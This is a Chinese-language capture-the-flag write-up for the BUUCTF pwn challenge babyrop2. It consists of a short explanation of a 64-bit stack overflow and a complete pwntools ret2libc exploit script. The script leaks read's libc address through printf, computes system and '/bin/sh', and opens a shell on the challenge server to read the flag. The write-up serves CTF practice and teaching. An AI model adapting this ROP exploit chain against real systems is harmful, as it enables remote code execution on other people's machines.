---
title: "BUUCTF Pwn [HarekazeCTF_2019]babyrop2"
date: 2020-03-09T16:56:46+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# babyrop2

64位的栈溢出，无system、/bin/sh，ret2libc3、ret2cas，需要泄露libc地址计算基地址，存在printf()、read()，可以通过printf泄露read地址来计算基地址，题目给出了libc.so.6文件

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-
from pwn import *
context.log_level = 'debug'

#sh = process('./babyrop2')
sh = remote('node3.buuoj.cn',29191)
elf = ELF('./babyrop2')
libc_elf = ELF('./libc.so.6')

main_addr = elf.symbols['main']
read_got_addr = elf.got['read']
printf_plt_addr = elf.plt['printf']
log.success('main_addr => {}'.format(hex(main_addr)))
log.success('read_got_addr => {}'.format(hex(read_got_addr)))
log.success('printf_plt_addr => {}'.format(hex(printf_plt_addr)))

format_str = 0x400770
pop_rdi_ret = 0x400733
pop_rsi_r15_ret = 0x400731

stack_offset = 0x20
fakerbp = 0x8

leak_payload = 'a' * (stack_offset+fakerbp)
leak_payload += p64(pop_rdi_ret)+p64(format_str) 
leak_payload += p64(pop_rsi_r15_ret)+p64(read_got_addr)+p64(0)+p64(printf_plt_addr)
leak_payload += p64(main_addr)

sh.recvuntil("What's your name?")
sh.sendline(leak_payload)
leak_read_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
#接收到\x7f后，把从\X7f的前6个截取，然后用\x00填充在高位组成一个8字节数
log.success('leak_read_addr => {}'.format(hex(leak_read_addr)))

libc_base = leak_read_addr - libc_elf.symbols['read']
libc_system_addr = libc_base + libc_elf.symbols['system']
libc_binsh_addr = libc_base + libc_elf.search('/bin/sh').next()

payload = 'a' * (stack_offset+fakerbp) 
payload += p64(pop_rdi_ret) + p64(libc_binsh_addr) + p64(libc_system_addr)
sh.recvuntil("What's your name?")
sh.sendline(payload)
sh.sendline("cat /home/babyrop2/flag")
sh.interactive()
```

![image-20200309171334744](/images/image-20200309171334744.png)

